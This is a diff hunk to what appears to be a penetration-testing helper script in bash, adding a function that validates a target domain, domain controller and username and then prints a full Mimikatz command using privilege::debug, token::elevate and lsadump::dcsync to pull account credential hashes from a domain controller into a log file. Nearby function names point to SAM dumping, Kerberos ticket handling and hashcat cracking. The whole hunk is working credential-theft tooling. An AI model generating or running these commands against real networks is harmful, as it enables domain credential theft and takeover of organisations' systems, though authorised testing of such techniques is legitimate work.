@@ -42,6 +42,26 @@ run_mimikatz_lsadump_sam() {
     hashcat_ntlm
 }
 
+run_mimikatz_dcsync() {
+    if [[ -z "$mimikatz_log" ]]; then
+        mimikatz_log="mimikatz_dcsync.log"
+    fi
+    if [[ -z "$target_domain" ]]; then
+        echo "Target domain must be set before running Mimikatz dcsync."
+        return 1
+    fi
+    if [[ -z "$dc_host" ]]; then
+        echo "Domain controller host must be set before running Mimikatz dcsync."
+        return 1
+    fi
+    if [[ -z "$target_username" ]]; then
+        echo "Target username must be set before running Mimikatz dcsync."
+        return 1
+    fi
+    echo '.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /domain:'"$target_domain"' /dc:'"$dc_host"' /user:'"$target_username"'" exit > '"$mimikatz_log"';'
+
+}
+
 run_mimikatz_kbtickets() {
     local unc_path="$1"
     if [ -z "$unc_path" ]; then
